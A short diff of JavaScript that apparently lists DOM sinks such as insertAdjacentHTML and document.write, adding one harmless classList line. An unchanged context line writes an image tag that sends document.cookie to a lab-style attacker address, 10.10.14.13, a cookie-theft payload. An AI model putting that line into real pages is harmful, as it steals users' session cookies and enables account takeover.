@@ -19,6 +19,8 @@ document.querySelectorAll('div');
 
 element.insertAdjacentHTML('beforeend', data_variable);
 
+element.classList.add("class-name");
+
 document.write('something');
 
 document.write('<img src="http://10.10.14.13/?'+document.cookie+'">');
